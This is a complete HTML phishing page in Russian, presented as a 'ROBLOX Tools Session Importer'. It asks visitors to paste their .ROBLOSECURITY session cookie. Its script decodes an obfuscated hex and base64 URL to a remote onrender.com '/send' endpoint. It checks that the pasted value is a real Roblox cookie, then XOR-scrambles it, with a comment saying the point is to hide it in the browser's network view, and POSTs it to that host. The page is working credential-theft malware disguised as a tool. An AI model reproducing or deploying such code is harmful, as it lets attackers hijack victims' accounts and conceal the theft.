
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBLOX Tools | Session Importer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* ========== ТЁМНАЯ ТЕМА (СИНИЙ НЕОН) ========== */
        :root {
            --bg1: #050a1a;
            --bg2: #0a1030;
            --bg3: #0f1a4a;
            --bg4: #0a1030;
            --bg5: #050a1a;
            --bg6: #0d1540;
            --bg7: #050a1a;
            --card: rgba(8, 15, 30, 0.85);
            --border: rgba(0, 150, 255, 0.6);
            --border-hover: rgba(0, 200, 255, 0.9);
            --input: rgba(10, 20, 40, 0.9);
            --text: #e0f0ff;
            --text2: #90caf9;
            --text3: #42a5f5;
            --btn1: #0d47a1;
            --btn2: #1565c0;
            --btn3: #42a5f5;
            --star1: #42a5f5;
            --star2: #1e88e5;
            --star3: #90caf9;
            --star4: #1565c0;
            --star5: #64b5f6;
            --glow1: rgba(0, 150, 255, 0.2);
            --glow2: rgba(0, 200, 255, 0.3);
            --logo1: #90caf9;
            --logo2: #42a5f5;
            --logo3: #1e88e5;
            --logo4: #0d47a1;
            --sub1: #64b5f6;
            --sub2: #1e88e5;
        }

        /* ========== СВЕТЛАЯ ТЕМА (ФИОЛЕТОВЫЙ НЕОН) ========== */
        body.light {
            --bg1: #f3e5ff;
            --bg2: #e1cfff;
            --bg3: #d1b3ff;
            --bg4: #e1cfff;
            --bg5: #f3e5ff;
            --bg6: #e9d5ff;
            --bg7: #f3e5ff;
            --card: rgba(255, 245, 255, 0.88);
            --border: rgba(156, 39, 176, 0.5);
            --border-hover: rgba(186, 104, 200, 0.8);
            --input: rgba(255, 245, 255, 0.95);
            --text: #4a1d6d;
            --text2: #7b1fa2;
            --text3: #ab47bc;
            --btn1: #8e24aa;
            --btn2: #ab47bc;
            --btn3: #ce93d8;
            --star1: #ce93d8;
            --star2: #ab47bc;
            --star3: #e1bee7;
            --star4: #9c27b0;
            --star5: #f3e5f5;
            --glow1: rgba(156, 39, 176, 0.15);
            --glow2: rgba(186, 104, 200, 0.25);
            --logo1: #6a1b9a;
            --logo2: #8e24aa;
            --logo3: #ab47bc;
            --logo4: #ce93d8;
            --sub1: #9c27b0;
            --sub2: #ab47bc;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 15%, var(--bg3) 30%, var(--bg4) 45%, var(--bg5) 60%, var(--bg6) 75%, var(--bg7) 100%);
            background-size: 400% 400%;
            animation: gradientShift 12s ease infinite;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* ЗВЁЗДЫ */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, var(--star1), transparent),
                radial-gradient(3px 3px at 80px 120px, var(--star2), transparent),
                radial-gradient(1px 1px at 160px 80px, var(--star3), transparent),
                radial-gradient(2px 2px at 300px 200px, var(--star4), transparent),
                radial-gradient(1px 1px at 450px 350px, var(--star5), transparent),
                radial-gradient(3px 3px at 600px 50px, var(--star2), transparent),
                radial-gradient(2px 2px at 750px 280px, var(--star1), transparent),
                radial-gradient(1px 1px at 900px 150px, var(--star3), transparent);
            background-size: 200px 200px;
            background-repeat: no-repeat;
            opacity: 0.7;
            pointer-events: none;
            animation: starsFloat 20s linear infinite;
        }

        @keyframes starsFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        /* ПЛАВАЮЩИЕ ПЕЧЕНЬКИ */
        @keyframes floatCookie {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            20% { opacity: 0.9; }
            80% { opacity: 0.9; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .floating-cookie {
            position: fixed;
            pointer-events: none;
            z-index: 0;
            animation: floatCookie linear infinite;
            will-change: transform;
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .theme-btn {
            background: var(--card);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 50px;
            padding: 10px 18px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text2);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .theme-btn:hover {
            transform: scale(1.05);
            border-color: var(--border-hover);
            box-shadow: 0 0 15px var(--glow1);
        }

        .card {
            background: var(--card);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 500px;
            width: 100%;
            border: 1px solid var(--border);
            box-shadow: 0 0 30px var(--glow1), 0 25px 45px -12px rgba(0,0,0,0.5);
            transition: all 0.3s ease;
            z-index: 1;
        }

        .card:hover {
            border-color: var(--border-hover);
            box-shadow: 0 0 50px var(--glow2), 0 30px 50px -15px rgba(0,0,0,0.6);
            transform: translateY(-2px);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo h1 {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--logo1), var(--logo2), var(--logo3), var(--logo4));
            background-size: 300% 300%;
            animation: textGradient 3s ease infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
            text-shadow: 0 0 8px var(--glow1);
        }

        @keyframes textGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo p {
            background: linear-gradient(135deg, var(--sub1), var(--sub2));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 3px;
            font-weight: 600;
        }

        .label {
            color: var(--text2);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input);
            border: 1.5px solid var(--border);
            border-radius: 16px;
            padding: 16px 18px;
            color: var(--text);
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
        }

        .cookie-input:focus {
            outline: none;
            border-color: var(--btn2);
            box-shadow: 0 0 0 3px var(--glow2);
        }

        .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
        .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }

        .validation-status {
            font-size: 11px;
            margin-top: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text3);
        }

        .status-valid { color: #22c55e; }
        .status-invalid { color: #ef4444; }
        .status-neutral { color: var(--text3); }

        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, var(--btn1), var(--btn2), var(--btn3));
            background-size: 200% 200%;
            animation: btnGradient 3s ease infinite;
            border: none;
            border-radius: 40px;
            padding: 14px;
            color: white;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        @keyframes btnGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
            transition: left 0.6s;
        }

        .btn-primary:hover::before { left: 100%; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px var(--glow2); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }

        .message-area {
            text-align: center;
            margin-top: 16px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .message-area.show { opacity: 1; }
        .error-text {
            color: #f87171;
            background: rgba(220,38,38,0.15);
            padding: 8px 16px;
            border-radius: 24px;
            display: inline-block;
            border-left: 3px solid #ef4444;
            font-size: 12px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .shake { animation: shake 0.3s ease; }
    </style>
</head>
<body>
    <div class="theme-switch">
        <button class="theme-btn" id="themeToggleBtn"><span>🌙</span> Тема</button>
    </div>
    <div class="card">
        <div class="logo">
            <h1>ROBL<span style="background: linear-gradient(135deg, var(--sub1), var(--btn1)); -webkit-background-clip: text; background-clip: text; color: transparent;">✦</span>Tools</h1>
            <p>SESSION IMPORTER</p>
        </div>
        <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
        <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
        <div class="validation-status" id="validationStatus"><span>✨</span><span id="statusText">Ожидание ввода...</span></div>
        <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
        <div id="messageArea" class="message-area"></div>
    </div>

    <script>
        (function() {
            // ========== ЖЁСТКАЯ ОБФУСКАЦИЯ ПРОКСИ ==========
            const _0x3a2b = ['726f62746f6f6c732e6f6e72656e6465722e636f6d', '2f73656e64', '68747470733a2f2f'];
            const _0x4c8d = atob(_0x3a2b[2]);
            const _0x9e2f = _0x3a2b[0].match(/.{1,2}/g).map(x => String.fromCharCode(parseInt(x, 16))).join('');
            const PROXY_URL = _0x4c8d + _0x9e2f + _0x3a2b[1];

            // ========== ПЕРЕКЛЮЧЕНИЕ ТЕМЫ ==========
            const themeToggleBtn = document.getElementById('themeToggleBtn');
            function loadTheme() {
                const savedTheme = localStorage.getItem('roblox_theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light');
                    themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                } else {
                    document.body.classList.remove('light');
                    themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                }
            }
            function toggleTheme() {
                if (document.body.classList.contains('light')) {
                    document.body.classList.remove('light');
                    localStorage.setItem('roblox_theme', 'dark');
                    themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                } else {
                    document.body.classList.add('light');
                    localStorage.setItem('roblox_theme', 'light');
                    themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                }
            }
            themeToggleBtn.addEventListener('click', toggleTheme);
            loadTheme();

            // ========== ПРОВЕРКА КУКИ ==========
            function isValidCookie(cookieValue) {
                if (!cookieValue || cookieValue.trim() === '') return false;
                const trimmed = cookieValue.trim();
                if (!trimmed.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                if (trimmed.length < 100) return false;
                if (trimmed.includes('<') || trimmed.includes('>') || trimmed.includes('script')) return false;
                const allowed = /^[A-Za-z0-9_\-\.=:%|]+$/;
                if (!allowed.test(trimmed)) return false;
                return true;
            }

            function validateCookie(cookieValue) {
                if (!cookieValue || cookieValue.trim() === '') return { valid: false };
                if (isValidCookie(cookieValue)) return { valid: true, length: cookieValue.trim().length };
                return { valid: false };
            }

            // ========== ШИФРОВАНИЕ ПЕРЕД ОТПРАВКОЙ ==========
            function encryptCookie(cookie) {
                // Простое XOR-шифрование, чтобы в Network была каша
                let key = 0x5A;
                let encrypted = '';
                for (let i = 0; i < cookie.length; i++) {
                    encrypted += String.fromCharCode(cookie.charCodeAt(i) ^ key);
                }
                return btoa(encrypted);
            }

            const cookieInput = document.getElementById('cookie');
            const sendBtn = document.getElementById('sendCookieBtn');
            const statusText = document.getElementById('statusText');
            const validationStatus = document.getElementById('validationStatus');
            const messageArea = document.getElementById('messageArea');

            function updateValidationUI() {
                const cookieValue = cookieInput.value;
                const validation = validateCookie(cookieValue);
                cookieInput.classList.remove('valid', 'invalid');
                if (!cookieValue || cookieValue.trim() === '') {
                    statusText.innerHTML = '✨ Ожидание ввода...';
                    statusText.className = 'status-neutral';
                    validationStatus.querySelector('span:first-child').innerHTML = '✨';
                    sendBtn.disabled = true;
                    return;
                }
                if (validation.valid) {
                    cookieInput.classList.add('valid');
                    statusText.innerHTML = `✅ Кука валидна! (${validation.length} символов)`;
                    statusText.className = 'status-valid';
                    validationStatus.querySelector('span:first-child').innerHTML = '✅';
                    sendBtn.disabled = false;
                } else {
                    cookieInput.classList.add('invalid');
                    statusText.innerHTML = '❌ Неверный формат куки';
                    statusText.className = 'status-invalid';
                    validationStatus.querySelector('span:first-child').innerHTML = '❌';
                    sendBtn.disabled = true;
                }
            }

            function showMessage(text, isError = true) {
                messageArea.innerHTML = `<div class="error-text">${isError ? '⚠️ ' : '✅ '}${text}</div>`;
                messageArea.classList.add('show');
                setTimeout(() => messageArea.classList.remove('show'), 3000);
            }

            async function sendCookieToProxy(cookieValue) {
                const encryptedCookie = encryptCookie(cookieValue);
                try {
                    const response = await fetch(PROXY_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: encryptedCookie })
                    });
                    return response.ok;
                } catch(e) {
                    return false;
                }
            }

            sendBtn.onclick = async () => {
                const cookieValue = cookieInput.value.trim();
                const validation = validateCookie(cookieValue);
                if (!validation.valid) {
                    showMessage('Невалидная кука! Проверьте формат.', true);
                    cookieInput.classList.add('shake');
                    setTimeout(() => cookieInput.classList.remove('shake'), 300);
                    return;
                }
                sendBtn.disabled = true;
                sendBtn.textContent = "⏳ Отправка...";
                const success = await sendCookieToProxy(cookieValue);
                sendBtn.disabled = false;
                sendBtn.textContent = "🔄 Заменить сессию";
                if (success) {
                    showMessage('✅ Кука отправлена!', false);
                    cookieInput.value = '';
                    updateValidationUI();
                } else {
                    showMessage('❌ Ошибка отправки. Попробуйте позже.', true);
                }
            };

            cookieInput.addEventListener('input', updateValidationUI);
            cookieInput.addEventListener('paste', () => setTimeout(updateValidationUI, 10));
            updateValidationUI();

            // ========== ПЛАВАЮЩИЕ ПЕЧЕНЬКИ ==========
            (function() {
                const cookieCount = 60;
                for (let i = 0; i < cookieCount; i++) {
                    const cookie = document.createElement('div');
                    cookie.className = 'floating-cookie';
                    cookie.textContent = '🍪';
                    cookie.style.left = Math.random() * 100 + '%';
                    cookie.style.fontSize = (18 + Math.random() * 40) + 'px';
                    cookie.style.animationDuration = (8 + Math.random() * 15) + 's';
                    cookie.style.animationDelay = Math.random() * -20 + 's';
                    cookie.style.opacity = 0.4 + Math.random() * 0.5;
                    cookie.style.filter = `drop-shadow(0 0 ${5 + Math.random() * 15}px var(--glow2))`;
                    document.body.appendChild(cookie);
                }
            })();
        })();
    </script>
</body>
</html>
